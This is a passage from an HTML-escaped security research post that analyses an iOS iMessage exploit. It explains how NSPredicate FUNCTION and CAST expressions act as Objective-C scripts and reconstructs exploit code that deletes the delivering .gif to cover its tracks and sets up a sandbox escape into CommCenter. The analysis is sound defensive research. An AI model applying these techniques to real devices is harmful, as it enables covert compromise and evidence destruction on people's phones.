href="https://developer.apple.com/documentation/foundation/nspredicate?language=objc"&gt;According to Apple&amp;#39;s public documentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;they are used &lt;/span&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c14"&gt;to define logical conditions for constraining a search for a fetch or for in-memory filtering&lt;/span&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c13 YDzVciBUld-c3"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;For example, in Objective-C you could filter an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSArray&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;object like this:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; NSArray* names = @[@&amp;quot;one&amp;quot;, @&amp;quot;two&amp;quot;, @&amp;quot;three&amp;quot;];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; NSPredicate* pred;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; pred = [NSPredicate predicateWithFormat:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; @&amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c17"&gt;SELF beginswith[c] &amp;#39;t&amp;#39;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;quot;];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; NSLog(@&amp;quot;%@&amp;quot;, [names filteredArrayUsingPredicate:pred]);&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;The predicate is &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;SELF beginswith[c] &amp;#39;t&amp;#39;&amp;quot;&lt;/span&gt;&lt;span&gt;. This prints an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSArray&lt;/span&gt;&lt;span&gt;&amp;nbsp;containing only &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;two&lt;/span&gt;&lt;span&gt;&amp;quot; and &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;three&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;quot;.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;[NSPredicate predicateWithFormat]&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;builds a predicate object by parsing a small query language, a little like an SQL query. &lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicates&lt;/span&gt;&lt;span&gt;&amp;nbsp;can be built up from &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSExpressions&lt;/span&gt;&lt;span&gt;, connected by &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSComparisonPredicates&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;(like less-than, greater-than and so on.)&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;NSExpressions&lt;/span&gt;&lt;span&gt;&amp;nbsp;themselves can be fairly complex, containing aggregate expressions (like &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;IN&lt;/span&gt;&lt;span&gt;&amp;quot; and &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CONTAINS&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;quot;), subqueries, set expressions, and, most interestingly, function expressions.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Prior to 2007 (in OS X 10.4 and below) function expressions were limited to just the following five extra built-in methods: &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;sum&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;count&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;min&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;max&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;average&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;But starting in OS X 10.5 (which would also be around the launch of iOS in 2007) &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;&amp;nbsp;were extended&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsexpression"&gt;to allow &lt;/a&gt;&lt;/span&gt;&lt;span class="YDzVciBUld-c6 YDzVciBUld-c14"&gt;&lt;a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsexpression"&gt;arbitrary&lt;/a&gt;&lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsexpression"&gt;&amp;nbsp;method invocations&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;FUNCTION&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;keyword:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;quot;FUNCTION(&amp;#39;abc&amp;#39;, &amp;#39;stringByAppendingString&amp;#39;, &amp;#39;def&amp;#39;)&amp;quot; =&amp;gt; @&amp;quot;abcdef&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;FUNCTION&lt;/span&gt;&lt;span&gt;&amp;nbsp;takes a target object, a selector and an optional list of arguments then invokes the selector on the object, passing the arguments. In this case it will allocate an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSString&lt;/span&gt;&lt;span&gt;&amp;nbsp;object &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;@&amp;quot;abc&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;then invoke the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;stringByAppendingString:&lt;/span&gt;&lt;span&gt;&amp;nbsp;selector passing the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSString&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;@&amp;quot;def&amp;quot;&lt;/span&gt;&lt;span&gt;, which will evaluate to the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSString&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;@&amp;quot;abcdef&amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;In addition to the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;FUNCTION&lt;/span&gt;&lt;span&gt;&amp;nbsp;keyword there&amp;#39;s &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CAST&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;which allows full reflection-based access to all Objective-C types (as opposed to just being able to invoke selectors on literal strings and integers):&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;&amp;nbsp; &amp;quot;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;FUNCTION(CAST(&amp;#39;NSFileManager&amp;#39;, &amp;#39;Class&amp;#39;), &amp;#39;defaultManager&amp;#39;)&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Here we can get access to the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFileManager&lt;/span&gt;&lt;span&gt;&amp;nbsp;class and call the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;defaultManager&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;selector to get a reference to a process&amp;#39;s shared file manager instance.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;These keywords exist in the string representation of &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicates&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSExpressions&lt;/span&gt;&lt;span&gt;. Parsing those strings involves creating a graph of &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSExpression&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects, &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects and their subclasses like &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpression&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;. It&amp;#39;s a serialized version of such a graph which is present in the JBIG2 bitmap.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicates&lt;/span&gt;&lt;span&gt;&amp;nbsp;using the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;FUNCTION&lt;/span&gt;&lt;span&gt;&amp;nbsp;keyword are effectively Objective-C scripts. With some tricks it&amp;#39;s possible to build nested function calls which can do almost anything you could do in procedural Objective-C. Figuring out some of those tricks was the key to the 2019 &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://realworldctf.com/"&gt;Real World CTF&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://github.com/ChiChou/DezhouInstrumenz/"&gt;DezhouInstrumenz&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;challenge, which would evaluate an attacker supplied &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSExpression&lt;/span&gt;&lt;span&gt;&amp;nbsp;format string. The &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/"&gt;writeup by the challenge author&lt;/a&gt;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;is a great introduction to these ideas and I&amp;#39;d strongly recommend reading that now if you haven&amp;#39;t. The rest of this post builds on the tricks described in that post.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.lu8fbgty57ln"&gt;&lt;span class="YDzVciBUld-c9 YDzVciBUld-c3"&gt;A tale of two parts&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;The only job of the JBIG2 logic gate machine described in the previous blog post is to cause the deserialization and evaluation of an embedded &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpression&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;. No attempt is made to get native code execution, ROP, JOP or any similar technique.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Prior to iOS 14.5 the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;isa&lt;/span&gt;&lt;span&gt;&amp;nbsp;field of an Objective-C object was not protected by Pointer Authentication Codes (&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PAC)&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span&gt;so the JBIG2 machine builds a fake Objective-C object with a fake &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;isa&lt;/span&gt;&lt;span&gt;&amp;nbsp;such that the invocation of the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;dealloc&lt;/span&gt;&lt;span&gt;&amp;nbsp;selector causes the deserialization and evaluation of the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpression&lt;/span&gt;&lt;span&gt;. This is very similar to the technique used by &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-3.html"&gt;Samuel in the 2020 SLOP post&lt;/a&gt;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;. &lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpression&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;has two purposes:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Firstly, it allocates and leaks an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;ASMKeepAlive&lt;/span&gt;&lt;span&gt;&amp;nbsp;object then tries to cover its tracks by finding and deleting the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;.gif&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;file which delivered the exploit.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Secondly, it builds a payload &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;object then triggers a logic bug to get that &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;object evaluated in the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;process, reachable from the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;IMTranscoderAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;sandbox via the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;com.apple.commcenter.xpc&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSXPC&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;service.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;Let&amp;#39;s look at those two parts separately:&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.t2uistlubhwq"&gt;&lt;span class="YDzVciBUld-c9 YDzVciBUld-c3"&gt;Covering tracks&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;The outer level &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpression&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;performSelectorOnMainThread:withObject:waitUntilDone&lt;/span&gt;&lt;span&gt;&amp;nbsp;which in turn calls &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;makeObjectsPerformSelector:@&amp;quot;expressionValueWithObject:context:&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;on an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSArray&lt;/span&gt;&lt;span&gt;&amp;nbsp;of four &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;. This allows the four independent &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;&amp;nbsp;to be evaluated sequentially.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;With some manual cleanup we can recover pseudo-Objective-C versions of the serialized &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;. &lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;The first one does this:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[[AMSKeepAlive alloc] initWithName:&amp;quot;KA&amp;quot;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This allocates and then &lt;/span&gt;&lt;span&gt;leaks an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;AppleMediaServices&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;KeepAlive&lt;/span&gt;&lt;span&gt;&amp;nbsp;object&lt;/span&gt;&lt;span&gt;. The exact purpose of this is unclear.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;The second entry does this:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[[NSFileManager defaultManager] _web_removeFileOnlyAtPath: &lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; [@&amp;quot;/tmp/com.apple.messages&amp;quot; stringByAppendingPathComponent:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; [ [ [ [&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [NSFileManager defaultManager]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; enumeratorAtPath: @&amp;quot;/tmp/com.apple.messages&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; allObjects&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; filteredArrayUsingPredicate:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [NSPredicate predicateWithFormat:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [@&amp;quot;SELF ENDSWITH &amp;#39;&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; stringByAppendingString: &amp;quot;XXX.gif&amp;quot;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; stringByAppendingString: &amp;quot;&amp;#39;&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ] &amp;nbsp; ] ] ]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; firstObject&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; ]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; ]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Reading these single expression &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;is a little tricky; breaking that down into a more procedural form it&amp;#39;s equivalent to this:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSFileManager* fm = [NSFileManager defaultManager];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSDirectoryEnumerator* dir_enum;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;dir_enum = [fm enumeratorAtPath: @&amp;quot;/tmp/com.apple.messages&amp;quot;]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span 